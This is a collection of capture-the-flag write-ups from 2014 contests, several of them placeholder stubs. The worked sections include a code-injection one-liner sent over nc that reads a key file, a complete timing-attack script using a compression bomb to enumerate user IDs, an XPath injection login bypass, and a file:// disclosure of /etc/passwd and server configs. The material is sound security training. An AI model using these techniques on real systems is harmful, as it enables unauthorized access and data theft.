$ echo ':c2VsZi5yZXF1ZXN0LnNlbmQob3Blbigna2V5JykucmVhZCgpKQo=' | nc -v radioactive.2014.ghostintheshellcode.com 4324
found 0 associations
found 1 connections:
     1: flags=82<CONNECTED,PREFERRED>
    outif en0
    src 192.168.107.131 port 59275
    dst 107.20.236.180 port 4324
    rank info not available
    TCP aux info available

Connection to radioactive.2014.ghostintheshellcode.com port 4324 [tcp/*] succeeded!
Waiting for command:
Welcom3ToTheNewAgeItsARevolutionISuppose
```

The flag is `Welcom3ToTheNewAgeItsARevolutionISuppose`.

## Other write-ups

* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-radioactive/>
* <http://tasteless.se/2014/01/gits-2014-radioactive-crypto-250/>

# Ghost in the Shellcode 2014 write-ups

* <http://ghostintheshellcode.com/2014-final/>
* [Trailer](https://www.youtube.com/watch?v=qzDyqWHzhjA&hd=1)
* [Choose Your Pwn Adventure 2 Credits](https://www.youtube.com/watch?v=PXFsGdnAYkg&hd=1)
* [Solve counts](http://ghostintheshellcode.com/2014-final/solve-counts.txt)
* [Team solves](http://ghostintheshellcode.com/2014-final/team-solves.txt)

## Completed write-ups

* [Ad Subtract](ad-subtract)
* [Boaring Music](boaring-music)
* [Cave of Nope](cave-of-nope)
* [CTF247](ctf247)
* [DOS Attack](dos-attack)
* [Moon Boots](moon-boots)
* [one](one)
* [phpcrypto](phpcrypto)
* [Rabbit of Caerbannog](rabbit-of-caerbannog)
* [Radioactive](radioactive)
* [Revenge of Imgception](revenge-of-imgception)

## Incomplete write-ups

* [A Boaring Quest](a-boaring-quest)
* [Byte Sexual](byte-sexual)
* [Dogecrypt](dogecrypt)
* [Fuzzy](fuzzy)
* [gitsmsg](gitsmsg)
* [Gitzino](gitzino)
* [inview](inview)
* [Long Live the Queen](long-live-the-queen)
* [lugkist](lugkist)
* [PapSmear](papsmear)
* [Pillowtalk](pillowtalk)
* [Portal](portal)
* [Snow Down](snow-down)
* [TI-1337](ti-1337)
* [TrustMeMore](trustmemore)
* [Unbearable](unbearable)

# Ghost in the Shellcode 2014: Revenge of Imgception

**Category:** Forensics
**Points:** 300
**Description:**

> Find the key. [Link](https://2014.ghostintheshellcode.com/roi-0252563f02b4e004978185322f1766b0/index.html)

## Write-up

The HTML source for that link is:

```
<html
<head>
  <script>
    function get_image() {
      var i = new Image();
      var num = parseInt((Math.random() * 50), 10) +1
      i.src = './' + num;
      document.getElementById('t').appendChild(i);
    }
  </script>
</head>
<body onload="get_image()">
  <div id="t"></div>
</body>
</html>
```

The `get_image` function generates a number from 1 to 50, and then uses that as part of the URL for an image. The image files don’t have an extension, but looking at the headers it’s obvious they’re JPEGs. So, let’s download them all:

```bash
$ for i in {1..50}; do curl -# "https://2014.ghostintheshellcode.com/roi-0252563f02b4e004978185322f1766b0/${i}" > "${i}.jpg"; done
```

The clue to the next step is hidden as base64-encoded data in the comment fields (`\xFF\xFE`) of these images. The number of comment fields is variable because they have a maximum size of `65535` (`0xFFFF`).

The extracted data is an animated GIF file. The next stage is hidden in a set of comment extensions as binary data. The number of comment extensions is variable depending on the size of the next stage.

The extracted data is is a zip file full of PNG images. The next stage is spread among them. Each PNG has a custom chunk marked with a `icTf` header. Each chunk begins with 3 bytes of the order string (`'ThankYouMarioButOurPrincessIsInAnotherCastle' * 20`) followed by a null byte, followed by binary data. The binary data chunks from each file must be concatenated together in the order given by the order string. The entirety of the order string may not be used, as the zip contains a variable number of files.

That results in a new file, which is a floppy disk image containing a Super Mario Brothers ROM image for the Nintendo Entertainment System. This can be played in [the FCEUX emulator](http://www.fceux.com/web/home.html), but that’s a red herring. Instead, the key to the next stage has been concatenated to the end of the ROM, and is marked with `'GITS' * 512`.

The next file is an ISO image with a hidden directory. When mounted with default (Linux) options, the only apparent file is a JPEG image. However, when mounted with the `--no-joliet` option, the next stage becomes apparent.

The file is a multi-page TIFF image with broken file magic. The file magic is `\x49\x4d\x2a\x2a`. The TIFF file header indicates whether the image is little endian or big endian by the first two bytes being either `\x49\x49` (little) or `\x4d\x4d` (big). The next two bytes are similarly arranged, either `\x2a\x00` (little) or `\x00\x2a` (big). The correct file header for this image is `\x49\x49\x2a\x00`. Once the header is fixed, the image contains three images - one world 7-1 image and two apparently identical world 8-1 images that constitute the next stage.

The files are two apparently identical greyscale BMP images. The images are not, however, identical. The final image is steganographically hidden in the delta between color byte values. By subtracting the byte values in one file from the corresponding byte in the other, some bytes result in a value between `-8` and `+7`. Each value represents a single nibble of the final image.

The final image contains a congratulatory message and the key: `K00pas@llth3w@yd0wn`.

## Other write-ups

* <http://pastebin.com/FXXzZqEg>

# Ghost in the Shellcode 2014: Snow Down

**Category:** Choose your Pwn Adventure 2
**Points:** 250
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

(TODO)

The flag is `Real pirates use Z3 not a cutlass`.

# Ghost in the Shellcode 2014: TI-1337

**Category:** Pwnable
**Points:** 100
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/ti-1337/ti-5b1ab693bc0298f8da4b22612d1a7683ed55d93a) running at ti-1337.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `WhyDidTheChickenCrossTheMobiusStrip`.

## Other write-ups

* <http://www.ctf.dk/gits-2014-ti-1337>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-ti-1337.html>
* <https://gist.github.com/withzombies/8514659>

# Ghost in the Shellcode 2014: TrustMeMore

**Category:** Reverse Engineering
**Points:** 150
**Description:**

> We let your ex write a service. Running at trustmemore.2014.ghostintheshellcode.com:7457. Password: trust is 74u57 -- but l33t doesn't have a u. Note: This challenge is not NAT-friendly.

## Write-up

(TODO)

The flag is `OnlyDDTEKWouldDoSomethingThisEvil`.

## Other write-ups

* <http://blog.zachorr.com/trustmemore/>
* [Source code for this challenge](https://gist.github.com/anonymous/8508605) (released after the CTF)

# Ghost in the Shellcode 2014: Unbearable

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to open a chest located in an area full of dangerous bears. To make things worse, cracking the chest takes five full minutes, during which the bears start shooting at you with machine guns.

When you drink _Wine_ in Choose Your Pwn Adventure 2, you get a slight damage resistance boost. To solve this challenge, hack this modifier to make you completely invulnerable instead. This allows you to get past the many dangerous machine-gun-armed bears.

(TODO)

The flag is `The Drunken Master can bear any trial`.

## Other write-ups

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
* <http://lockboxx.blogspot.com/2014/01/ghost-in-shellcode-2014-ctf-writeup.html>
* <http://quangntenemy.blogspot.com/2014/01/ghost-in-shellcode-2014.html>
* <http://tasteless.se/2014/01/gits-2014-unbearable-pwn-adventure-75>

# NotSoSecure CTF 2014: Flag 1

## Write-up

(TODO)

## Other write-ups

* <http://blog.justinsteven.com/posts/2014/04/21/notsosecures-2nd-sqlilab-ctf-writeup/>

# NotSoSecure CTF 2014: Flag 2

## Write-up

(TODO)

## Other write-ups

* <http://blog.justinsteven.com/posts/2014/04/21/notsosecures-2nd-sqlilab-ctf-writeup/>

# NotSoSecure CTF 2014

* [Main website](http://ctf.notsosecure.com/)
* [@NotSoSecure on Twitter](https://twitter.com/NotSoSecure)

## Completed write-ups

* none yet

## Incomplete write-ups

* [Flag 1](flag-1)
* [Flag 2](flag-2)

# Nuit du Hack CTF Qualifications: Abitbol

**Category:** Web
**Points:** 100
**Description:**

> Hah! Check out this website that I found.. Such obvious vulnerabilities! The admin is really dumb too.
>
> http://abitbol.nuitduhack.com/

## Write-up

(TODO)

The flag is `IJustTookaHUGEMySQLDUMP`.

## Other write-ups

* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-web-write-ups/>

# Nuit du Hack CTF Qualifications: Another One

**Category:** Crypto
**Points:** 300
**Description:**

> This is a crypted image, you must extract the data.
>
> [`crypted.bmp`](crypted.bmp)

## Write-up

(TODO)

## Other write-ups

* <http://balidani.blogspot.com/2014/04/nuit-du-hack-quals-another-one-writeup.html>

# Nuit du Hack CTF Qualifications: Big Momma

**Category:** Miscellaneous
**Points:** 200
**Description:**

> Steve programmed a service to authenticate him for administration purposes, take control... IP: 54.217.202.218 Port: 3000
>
> [`bigmomma.tar`](bigmomma.tar)

## Write-up

(TODO)

## Other write-ups

* <http://sigint.ru/nuitduhack2014/>

# Nuit du Hack CTF Qualifications: Carbonara

**Category:** Crypto
**Points:** 50
**Description:**

> I'm craving some italian.. How about you?
>
> [`Carbonara.txt`](Carbonara.txt)

## Write-up

[The provided text file](Carbonara.txt) has the following contents:

```
%96 7=28 7@C E9:D 492= :D iQx>A6C2E@C xF=:FD r26D2C s:GFDQ]
```

(TODO)

## Other write-ups

* <http://sigint.ru/nuitduhack2014/>
* <http://www.pwntester.com/blog/2014/04/06/nuitduhack-2014-crypto-write-ups/>

# Nuit du Hack CTF Qualifications: Data extraction

**Category:** Forensics
**Points:** 300
**Description:**

> On a machine infected by Jupiter malware, some documents were transfered through the network
>
> [`Jupiter.pcap`](Jupiter.pcap)

## Write-up

(TODO)

## Other write-ups

* <https://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fforum.reverse4you.org%2Fshowthread.php%3Ft%3D1678>

# Nuit du Hack CTF Qualifications: GodMode

**Category:** Steganalysis
**Points:** 100
**Description:**

> Data was hidden in this image. Your goal is to extract them

## Write-up

(TODO)

## Other write-ups

* <http://dem0version.wordpress.com/2012/03/14/hello-world/>

# Nuit du Hack CTF Qualifications: Here, kitty kitty!

**Category:** Steganalysis
**Points:** 50
**Description:**

> I just can't get enough of this sweet melody, I can listen to it for hours! Sometimes I even feel like it is trying to send me a message ..
>
> [`HelloKittyKitty.wav`](HelloKittyKitty.wav)

## Write-up

Opening the file in a sound editor like Audacity reveals that the left audio channel contains something special:

![](screenshot.png)

It looks like a morse code. Let’s type it out:

```
..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.
```

According to [an online morse decoder](http://morsecode.scphillips.com/jtranslator.html), this translates to:

```
5BC925649CB0188F52E617D70929191C
```

I tried entering this as the flag but it was not accepted. Googling for it [reveals](http://md5.gromweb.com/?md5=5bc925649cb0188f52e617d70929191c) that `5bc925649cb0188f52e617d70929191c` (in lowercase) is the MD5 hash of the string `valar dohaeris`.

The correct flag was `5bc925649cb0188f52e617d70929191c` (in lowercase).

## Other write-ups

* <http://csrc.tamuc.edu/css/?p=143>
* <http://sigint.ru/nuitduhack2014/>

# Nuit du Hack CTF Qualifications: Nibble

**Category:** Miscellaneous
**Points:** 600
**Description:**

> Check out our new chat server! We GUARANTEE that it is unhackable. Seriously.
>
> Resources: [`NibblesClient.tar.gz`](NibblesClient.tar.gz)
>
> Target server IP address: 54.217.202.218
>
> [`NibbleServer`](NibbleServer)

## Write-up

(TODO)

## Other write-ups

* <http://blog.dragonsector.pl/2014/04/nuit-du-hack-ctf-quals-2014-nibble.html>

# Nuit du Hack CTF Qualifications: Nightly Auth

**Category:** Miscellaneous

**Points:** 400

**Description:**
> Your goal is to authenticate to the service IP: 54.217.202.218 Port: 1337
>
> [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz)

## Write-up

The provided [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz) file contains parts of the source code for a server-side script and a client.

The server reads the client data until it sends a packet ending with `\x45\x4f\x53` (EOS).

```python
while line[-3:] != "\x45\x4f\x53":
  data = socket.recv(1024)
  if not data:
    break
  line += data
  cur_data += 1
  # If the client have sent too much packets, kick it.
  if cur_data >= max_data:
    kick_notice(socket,"Too much data.")
    line = ""
    break
if line:
  print("[~] Checking token.")
  auth_class.check_token(line)
```

After receiving all the client data, the server checks if the supplied username is valid.

```python
def check_token(self,token):
  print("[~] Processing token...")
  # Split the data and check the opcode.
  data = re.split(regexsplitter, token)
  if data[0] == "1":
    print("[+] TOKEN_REQUEST !")
    # Check if the user is valid...
    if check_username(data[1]):
      print("[+] Valid UserID :)")
      # Generate a token for the client.
      self.process(data)
    else:
      print("[!] Bad UserID...")
      self.fail()
  elif data[0] == "2":
    print("[+] AUTH_REQUEST !")
    self.process(data)
```

Let’s take a look at the client.

```python
  def token_packet(self,uid,pwd):
      print("[~] Sending TOKEN Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, pwd))

  def auth_packet(self,uid,pwd,token):
      print("[~] Sending AUTH Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, pwd, token))

  def get_challenge(self):
    s = self.make_socket()
    s.sendall(self.token_packet(self.uid,self.pwd))
    data = s.recv(1024)
    self.nonce = data
    print("Got new challenge. Len : %s" % len(self.nonce))
    s.close()

  def auth(self):
    print("[~] Sending with new challenge...")
    s = self.make_socket()
    s.sendall(self.auth_packet(self.uid,self.pwd,self.nonce))
    print("Server response : %s" % s.recv(1024))
    s.close()

if __name__ == "__main__":
  print("Client started.")
  auth = Authentification()
  auth.set_credentials("1","password")
  auth.get_challenge()
  auth.auth()
```

1. The client first sends a `get_challenge` (Opcode: 1) request, with an UID and a password.
2. The server answers with a token. The size differs with every packet.
3. The client sends an `auth_packet` (Opcode: 2) with the same UID, the same password and the token sent by the server.

After trying the client with username `1`, the server sent me a token. The same thing happened for username `2`. It seems that even if the username is invalid, the server always sends a token. So we can’t guess if the username is valid or not based on the token…

The server had a problem with **load balancing**: after our first `get_challenge` request, the `auth_packet` was redirected to another server. That wasn’t a problem for exploiting, we just had to sent the `auth_packet` five times until we hit the good server (round-robin and 5 servers).

Let’s take a look at the `process()` function…

```python
def process(self,data):
  if data[3] != "EOS": #If it's not an TOKEN Request, decompress the current token token.
    print("[~] Decompressing the token...")
    token = decompress(data[3])
  if data[0] == "1": # If it's a token request, create and sent a new token.
    print("[TOKEN_REQUEST] Generating a valid token...")
    self.send_token(data[1],data[2])
    return True
  if token:
    print("[AUTH_REQUEST] Verifying the token...")
    time.sleep(3) # Sleep for blocking bruteforce attacks.
    if self.token_verifier.verify(token,data[1],data[2]):
      AuthSuccess()
      return True
    else:
      AuthFail()
      return False
```

Looking at the client code, we can see user data is separated with `\x02\x01\x02\x01`.

In the `process` function, called only if the username is valid, we can see that the server is checking if `data[3]` contains `EOS`, if not it decompresses the token. That means that if we send a `get_challenge` packet (Opcode 1), with a **fourth field** (a token), it will **decompress** this field and will not go to `time.sleep(3) # Sleep for blocking bruteforce attacks`!

**Decompressing data can take time**, and because **`process()` is only called when a user is valid**, we can guess if the username is valid by looking at the response time. Let’s try to exploit this flaw!

First of all, we have to guess which username is valid… This little exploit will help you.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'nightlydev <n.chatelain[at]sysdream.com>'
from timeit import default_timer
from zlib import compress, decompress
import socket
from numpy import mean
import time

class TimingAttack:
  def __init__(self,target):
    self.payload = None
    self.bombtimer = None
    self.target = target
    # We generate a ZIP Bomb to make the server lag.
    self.generate_exploit()
    print("[~] Timing attack ready.")

  def generate_exploit(self):
    # We compress a lot of "zeroes", small payload to send, but can take some time to decompress :) !
    print("[~] Generating bomb...")
    start = default_timer()
    self.payload = compress('0'*40000000)
    stop = default_timer()
    print("[+] Bomb generated - Took : %f to compress." % (stop - start))
    time.sleep(1)
    # We try to decompress the payload, which will be used as a trigger
    start = default_timer()
    decompress(self.payload)
    stop = default_timer()
    self.bombtimer = (stop - start)/2 # You have to adjust this offset if you have a lot of false positives
    print("[+] Bomb test - Time offset set : %f." % self.bombtimer)

  def create_socket(self):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(self.target)
    return s

  def avg_timer(self):
    # We first need to get the average response time of the server.
    timers = []
    sock = self.create_socket()
    for x in range(0,50):
      took = self.send_exploit(x)
      timers.append(took)
    print("[~] Average response time : %f" % mean(timers))
    # When a response is higher than the trigger, this may be caused by a decompression.
    self.trigger = mean(timers)+self.bombtimer

  def bruteforce(self,max_uids=10000):
    print("[~] Sending TOKEN probes...")
    start = default_timer()
    # We try to determine which usernames are valid.
    for userid in range(1,max_uids+1):
      current = (float(userid)/max_uids)*100
      timer = self.send_exploit(userid)
      print('[~] Uid : %d took : %f (%d%% completed)' % (userid,timer,current))
      if timer >= self.trigger:
        stop = default_timer()
        print("[+] Possible valid UID : %d found in %d seconds." % (userid,(stop-start)))
        # We check if the userid is a false positive.
        self.confirm(userid)
    print("[+] Timing attack done.")

  def send_exploit(self, user_id):
    # We send a payload, and get the time it needs to answer.
    sock = self.create_socket()
    self.send_payload(sock,user_id)
    start = default_timer()
    data = sock.recv(1024)
    stop = default_timer()
    sock.close()
    return (stop-start)

  def confirm(self,uid):
    # This function is used to test if a userid is valid.
    success = 0
    for attempt in range(0,20):
      took = self.send_exploit(uid)
      print("[~] Test n°%d : %f" % (attempt,took))
      if (took >= self.trigger):
        print("[+] BANGARANG !")
        success += 1
      else:
        print("[-] Nooooooo !")
    success_rate = float(success)/20*100
    print("[~] Test results : %d seems to be %f%% valid." % (uid,success_rate))
    if success_rate >= 50:
      print("[+] User ID : %d doesn't seem to be a false positive." % uid)
      while True:
        password = raw_input("Enter password (cancel with 'quit')\nNightlysploit $> ")
        if password == "quit": break
        self.establish_connection(uid,password)

  def establish_connection(self,uid,password):
    # This function is used to test if a username is valid.
    sock = self.create_socket()
    print("[~] Sending get_challenge")
    sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, password))
    challenge = sock.recv(1024)
    sock.close()
    print("[~] Got challenge... Sending auth.")
    # We send the auth 5 times because of load-balancing.
    for x in range(0,5):
      sock = self.create_socket()
      sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, password, challenge))
      response = sock.recv(1024)
      if (response == "You were kicked by the NightlyAUTH Server. Reason : Authentification failed.\n"):
        print("[~] Auth failed...")
      else:
        print("[+] Server answered : %s" % response)

  def chunks(self, l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

  def send_payload(self,sock,uid):
    counter = 0
    #      OPCODE       UID         PASS
    sock.sendall("1\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01" % (uid,"ninja"))
    for data in self.chunks(self.payload,980):
      counter += 1
      sock.sendall(data)
    # END OF STREAM
    sock.sendall("\x45\x4f\x53")

if __name__ == "__main__":
  boom = TimingAttack(("54.217.202.218",1337))
  print("[~] Discovering average response time...")
  boom.avg_timer()
  print("[~] Bruteforcing...")
  boom.bruteforce()
```

After **8 minutes** on a cheap VPS server, we get the following result:

```
[~] Uid : 3240 took : 0.068480 (32% completed)
[~] Uid : 3241 took : 0.069281 (32% completed)
[~] Uid : 3242 took : 0.069874 (32% completed)
[~] Uid : 3243 took : 0.224517 (32% completed)
[+] Possible valid UID : 3243 found in 484 seconds.
[~] Test n°0 : 0.215680
[+] BANGARANG !
[~] Test n°1 : 0.217219
[+] BANGARANG !
[~] Test n°2 : 0.208675
[+] BANGARANG !
[~] Test n°3 : 0.199905
[+] BANGARANG !
[~] Test n°4 : 0.229774
[+] BANGARANG !
[~] Test n°5 : 0.208620
[+] BANGARANG !
[~] Test n°6 : 0.193230
[+] BANGARANG !
[~] Test n°7 : 0.204750
[+] BANGARANG !
[~] Test n°8 : 0.215756
[+] BANGARANG !
[~] Test n°9 : 0.211181
[+] BANGARANG !
[~] Test n°10 : 0.196094
[+] BANGARANG !
[~] Test n°11 : 0.213732
[+] BANGARANG !
[~] Test n°12 : 0.197914
[+] BANGARANG !
[~] Test n°13 : 0.195056
[+] BANGARANG !
[~] Test n°14 : 0.210873
[+] BANGARANG !
[~] Test n°15 : 0.201116
[+] BANGARANG !
[~] Test n°16 : 0.218596
[+] BANGARANG !
[~] Test n°17 : 0.216802
[+] BANGARANG !
[~] Test n°18 : 0.215007
[+] BANGARANG !
[~] Test n°19 : 0.222972
[+] BANGARANG !
[~] Test results : 3243 seems to be 100.000000% valid.
[+] User ID : 3243 don't seems to be a false positive.
Enter password (cancel with 'quit')
Nightlysploit $>
```
We can see a **big** difference between a bad user ID and a good user ID. (+0.15 seconds) If the network is *unstable*, we just have to raise the number of zeroes to compress.

Ok, we have a good user id, but we don’t have a password. Let’s see if we can enter a random password…

```
Nightlysploit $> nico
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
```

Ok, it doesn’t work. Let’s try with something more… **agressive**.

```
Nightlysploit $> "'��u("'�f"�ht"
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```
Something happened! Maybe it’s the quotes… After trying a single quote, it seems that a double quote is making the server behave strangely. Could this be SQL injection?

```
Nightlysploit $> " OR 1=1 OR "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```

Nope, it makes the application behave strangely too… It looks like SQL, but it isn’t. Maybe it’s XPath? Let’s retry the earlier injection with lowercase characters.

```
Nightlysploit $> " or 1=1 or "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered : The flag is : D34RG0DILUVC00KIEZ
```

Boom. The flag is `D34RG0DILUVC00KIEZ`.

## Other write-ups

* none yet

# Nuit du Hack CTF Qualifications: Onion Rings

**Category:** Miscellaneous
**Points:** 150
**Description:**

> A new black market has appeared and has been targeted by the FBI. After checking for suspicious posts on stackoverflow and finding nothing, they give up and are offering a bounty to anyone who can get information on the server that is hosting the hidden service.
>
> http://mq72g4732yorslzf.onion/

## Write-up

`.onion` URLs can only be visited through the Tor network. After firing up Tor and browsing around for a bit, <http://mq72g4732yorslzf.onion/upload.php> seems vulnerable to file disclosure. Entering `file:///etc/passwd` in the URL field results in the following HTML after submitting the form:

```html
…
<img src="data:image/gif;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovYmluL3NoCmJpbjp4OjI6MjpiaW46L2JpbjovYmluL3NoCnN5czp4OjM6MzpzeXM6L2RldjovYmluL3NoCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L2Jpbi9zaAptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovYmluL3NoCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi9iaW4vc2gKbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovYmluL3NoCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L2Jpbi9zaAp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L2Jpbi9zaApwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L2Jpbi9zaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi9iaW4vc2gKYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovYmluL3NoCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L2Jpbi9zaAppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L2Jpbi9zaApnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L2Jpbi9zaApub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi9iaW4vc2gKbGlidXVpZDp4OjEwMDoxMDE6Oi92YXIvbGliL2xpYnV1aWQ6L2Jpbi9zaApEZWJpYW4tZXhpbTp4OjEwMToxMDM6Oi92YXIvc3Bvb2wvZXhpbTQ6L2Jpbi9mYWxzZQpzdGF0ZDp4OjEwMjo2NTUzNDo6L3Zhci9saWIvbmZzOi9iaW4vZmFsc2UKc3NoZDp4OjEwMzo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpudHA6eDoxMDQ6MTA2OjovaG9tZS9udHA6L2Jpbi9mYWxzZQpkZWJpYW4tdG9yOng6MTA1OjEwODo6L3Zhci9saWIvdG9yOi9iaW4vZmFsc2UKbXlzcWw6eDoxMDY6MTA5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=">
…
```

Base64-decoding that reveals the contents of the file, in this case `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:104:106::/home/ntp:/bin/false
debian-tor:x:105:108::/var/lib/tor:/bin/false
mysql:x:106:109:MySQL Server,,,:/nonexistent:/bin/false
```

Entering a non-existent file or directory path results in the following:

```html
<img src="data:image/gif;base64,">
```

Entering a valid directory path or the path to a file larger than 2.7 KB results in:

```html
The maximum image size is 2.7kb, yunno, for the cookies.
```

Let’s try entering `file:///etc/hosts` to see what `/etc/hosts` looks like:

```
127.0.0.1 localhost.localdomain localhost
192.168.99.22 quals.hackerzvoice.net quals
212.83.153.197 quals.hackerzvoice.net quals

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Visiting <http://quals.hackerzvoice.net/> in a regular browser doesn’t reveal anything interesting, but this configuration shows that when the server running the Onion Rings website accesses that hostname, it will resolve to a local IP address in the same network. So let’s see what the main page says by entering `http://quals.hackerzvoice.net/` in the URL field. The [resulting HTML page can be viewed here](blog.html). It contains the following:

> He started screaming at me saying weird shit I didn’t understand, then he just lookde blank and mumbled: “The flag .. The flag.. It is ’0hSh1t1r4n0ut0fn00dl35′. And then he just died in front of me. Weird..

The flag is `0hSh1t1r4n0ut0fn00dl35`.

## Additional information

At first I thought the flag would be hidden in the source code of the Onion Rings website itself. The `/etc/passwd` file (see above) hints that Apache is used, but the `/var/www/html/` directory (the default on most installations) didn’t seem to exist.

To figure out the correct path, let’s look at `/etc/apache2/ports.conf`:

```
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default
# This is also true if you have upgraded from before 2.2.9-3 (i.e. from
# Debian etch). See /usr/share/doc/apache2.2-common/NEWS.Debian.gz and
# README.Debian.gz

NameVirtualHost *:80
Listen 80
Listen 8056

<IfModule mod_ssl.c>
    # If you add NameVirtualHost *:443 here, you will also have to change
    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
    # to <VirtualHost *:443>
    # Server Name Indication for SSL named virtual hosts is currently not
    # supported by MSIE on Windows XP.
    Listen 443
</IfModule>

<IfModule mod_gnutls.c>
    Listen 443
</IfModule>
```

The header comment points to `/etc/apache2/sites-enabled/000-default`. Let’s see what’s in there:

```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www/blog
    <Directory />
        Options FollowSymLinks
        AllowOverride None
    </Directory>
    <Directory /var/www/blog/>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride None
        Order allow,deny
        allow from all
    </Directory>

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Order allow,deny
        Allow from all
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn

    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:8056>
    ServerName mq72g4732yorslzf.onion
    DocumentRoot /var/www/onion_rings
</VirtualHost>
```

This reveals that the server hosts a blog (the one we found the flag on) from the `/var/www/blog/` directory, and the Onion Rings website from `/var/www/onion_rings`.

